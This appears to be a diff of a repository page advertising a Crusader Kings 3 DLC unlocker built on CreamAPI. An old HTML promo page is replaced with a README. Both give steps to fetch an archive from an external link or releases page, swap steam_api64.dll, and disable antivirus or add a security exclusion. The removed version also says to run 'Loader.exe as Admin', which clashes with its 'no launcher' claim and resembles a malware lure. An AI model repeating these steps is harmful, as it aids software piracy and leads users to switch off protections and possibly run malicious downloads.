@@ -1,25 +1,54 @@
-<div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
-<h1 style="color:#66ff99;border-bottom:2px solid #33cc66;text-align:center;">🔧 Crusader Kings 3 DLC Unlocker – Standalone CreamAPI + Config Files 🔧</h1>
-<p style="font-size:1.1em;text-align:center;"><strong>Lightweight Steam‑only DLC unlocker for CK3 – based on the classic CreamAPI.</strong> Pre‑configured cream_api.ini with all DLC IDs for Crusader Kings 3, including every expansion, flavor pack, and cosmetic DLC up to the latest patch. Just copy files into your game directory.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#66ff99;color:#000;padding:12px 25px;">⬇️ DOWNLOAD STANDALONE UNLOCKER (LOADER)</a><p>✅ Lightweight ✅ Pre‑configured ✅ Steam only ✅ Ready to drop in</p></div>
-<img src="https://sun9-7.userapi.com/impg/n5yCRzwK78eW2nckKMr34-1wGnnEtdQZ6ncj-g/pQE_AmEI3vU.jpg?size=1536x1024&quality=95&sign=d091b2b75e6540e8d8ae872f95bc7515&type=album" style="max-width:100%;border-radius:8px;margin:15px 0;">
-<div><h3>📦 What’s Inside the Standalone Pack:</h3>
-<ul><li><strong>cream_api.ini (fully pre‑configured):</strong> Contains all CK3 DLC IDs, including: Northern Lords (ID 1661240), Royal Court (ID 1661241), Fate of Iberia (ID 1990020), Tours & Tournaments (ID 2180340), Legacy of Persia (ID 2403770), Roads to Power (ID 2930170), the Elegance of the Empire cosmetic pack (ID 2305870), and all remaining flavor/unit/portrait/soundtrack DLCs.</li>
-<li><strong>Steam DLL replacement (version‑agnostic):</strong> Works with the latest Steam client and CK3 updates – tested on the current 1.13.x patch.</li>
-<li><strong>Original file backup:</strong> Includes a copy of the original Steam DLL to revert changes without reinstalling.</li>
-<li><strong>Simple drag‑and‑drop installation:</strong> No launcher, no background services – just copy files into the game folder where `Crusader Kings III.exe` resides.</li></ul>
-<h3>🛠️ How CreamAPI Works (CK3 Edition):</h3>
-<ul><li><strong>No modifications to game files – only Steam API interception.</strong> The game requests DLC ownership from the Steam API; the modified DLL returns “owned” for all listed DLC IDs while leaving the original game data untouched.</li>
-<li><strong>Works with any legitimate Steam copy of CK3.</strong> You must own the base game; the unlocker does not generate a license or crack the main executable.</li>
-<li><strong>Safe for achievements, cloud saves, and multiplayer.</strong> Steam achievements, cloud saves, and even multiplayer (with friends who also have the DLCs unlocked) work normally – the game considers you a valid DLC owner.</li>
-<li><strong>Compatible with most mods.</strong> CreamAPI does not interfere with mod loading via Paradox launcher or manual mod installation.</li></ul>
-<h3>📝 In‑Game DLC Activation:</h3>
-<ul><li>After installation, launch CK3 through Steam. The Paradox launcher will show all DLCs as “owned” and “enabled”.</li>
-<li>If a DLC does not appear immediately, restart Steam once to refresh the DLC license cache.</li>
-<li>Some DLC features (e.g., the Royal Court throne room) require you to be at least Duke rank – they will unlock automatically when you meet the condition.</li>
-<li>To verify all DLCs are active, start a new game and check the “Game Rules” screen – new start dates (Iberia Struggle, Fall of Rome) should be visible.</li></ul>
-<h3>⚙️ System Requirements:</h3><p>Windows 10/11, Crusader Kings 3 (Steam version) installed, 10 MB free space.</p>
-<h3>📥 Installation:</h3>
-<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center;"><div>1. Download archive</div><div>2. Disable antivirus (temp)</div><div>3. Run Loader.exe as Admin</div><div>4. Press INSERT to open menu</div></div>
-<div><strong>Tags:</strong> crusader kings 3 creamapi download, ck3 dlc unlocker steam, crusader kings 3 all dlc creamapi.ini, ck3 creamapi latest patch, crusader kings 3 dlc crack steam, ck3 unlock all expansions creamapi, crusader kings 3 royal court unlock creamapi, ck3 tours and tournaments creamapi, crusader kings 3 roads to power creamapi, ck3 legacy of persia dlc unlock creamapi, crusader kings 3 cosmetic dlc unlock, ck3 achievements with creamapi, crusader kings 3 steam deck dlc unlock</div>
-</div>
+# ⚔️ Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files - Access All Crusader Kings 3 Content
+
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Smelling-stretch980/Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files/releases)
+
+This software allows users to access downloadable content files for the game Crusader Kings 3 on the Steam platform. It uses the CreamAPI framework to modify how the game interacts with Steam during startup. This process unlocks content packs, expansions, and cosmetic additions that are otherwise locked behind a purchase wall within the Steam store.
+
+## 🛠 Prerequisites
+
+Ensure you have a legitimate copy of Crusader Kings 3 installed on your Windows computer. This tool works specifically with the Steam version of the game. Verify your game files through the Steam client before you start the setup process. Right-click the game in your Steam Library, select Properties, click Installed Files, and choose Verify integrity of game files. This action ensures a clean baseline for the modification.
+
+You need basic administrator permissions on your Windows account to modify files in the game installation directory. Close the Steam application completely before you start. Steam must not run while you perform these installation steps.
+
+## 📥 Downloading the Files
+
+Visit this page to download the necessary files: [https://github.com/Smelling-stretch980/Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files/releases](https://github.com/Smelling-stretch980/Crusader-Kings-3-DLC-Unlocker-Standalone-CreamAPI-Config-Files/releases)
+
+Select the latest release version listed on the page. Download the compressed archive file, usually in a .zip or .rar format. Save this folder to your desktop or a temporary location where you can easily find it. Extract the contents of the archive using your preferred file management tool. You should see a set of configuration files and a dynamic link library file, typically named cream_api.dll or similar.
+
+## ⚙️ Installation Procedure
+
+1. Open your Steam Library.
+2. Right-click Crusader Kings 3.
+3. Select Manage.
+4. Select Browse local files. This command opens the folder where Steam stores the game data.
+5. Identify the main game folder. Look for a folder named bin or a location containing the game executable file, which ends in .exe.
+6. Drag the files you extracted from the downloaded archive into this game folder.
+7. If your computer asks to replace existing files, select Yes or Replace. The process swaps the original steam_api64.dll file with the version provided by this unlocker.
+8. Confirm the files now sit inside the folder alongside the game executable.
+
+## 🛡 Security and Safety
+
+Anti-virus software sometimes detects tools like this as potential threats because they modify original game files. This behavior occurs because the unlocker overrides how the game verifies licenses with Steam. Create an exclusion in your Windows Security settings for the game folder to prevent your system from deleting the new files.
+
+Set an exclusion by navigating to Virus & threat protection settings, selecting Manage settings, scrolling to Exclusions, and choosing Add or remove exclusions. Point the exclusion to the folder where you installed the unlocker files. This step ensures that the mod remains functional during future scans.
+
+## 🚀 Running the Game
+
+Launch the game directly through the Steam client. When you run Crusader Kings 3, the modified file intercepts the verification request to Steam. The game registers the presence of the additional content files immediately upon loading the main menu. 
+
+Check the game menu or the launcher interface to confirm that the expansions appear as active. You can start a new campaign and inspect the available bookmarks or ruler designer options to verify that the extra content is ready for use. If the DLC does not appear, close the game and relaunch Steam to ensure all background processes recognize the new environment.
+
+## 🔧 Troubleshooting Common Issues
+
+If the game fails to launch, verify that you placed the files in the correct directory. Steam sometimes updates the game file structure, potentially moving the executable file to a different sub-folder. Ensure the dll file sits in the same directory as the game launcher.
+
+If the game detects an error during startup, use the Steam verify integrity function to restore the game to its original state. Re-apply the files from the archive carefully. Do not use this tool while Steam is in offline mode, as that may disrupt the initial load sequence of the CreamAPI interface.
+
+Keep your game updated. If an official game patch arrives, the unlocker might require an update. Check the repository download link frequently for new versions that correspond with the current game build. If a new game update breaks the installation, revert to the original files using the Steam verification tool, then wait for an updated version of the config files.
+
+## 📋 System Requirements
+
+This tool functions on Windows 10 and Windows 11. It requires enough disk space to hold the base game and the installed expansions. No additional software or programming environments need installation. The memory requirements remain identical to the base game requirements for Crusader Kings 3. 
+
+The configuration files remain small, occupying less than one megabyte of storage space. They function independently of the Steam cloud saves, meaning your save progress remains stored in your standard user documents folder. This setup keeps your personal game history separate from the modded files, providing a way to remove the unlocker without deleting your progress if you wish to return to a standard Steam configuration later.
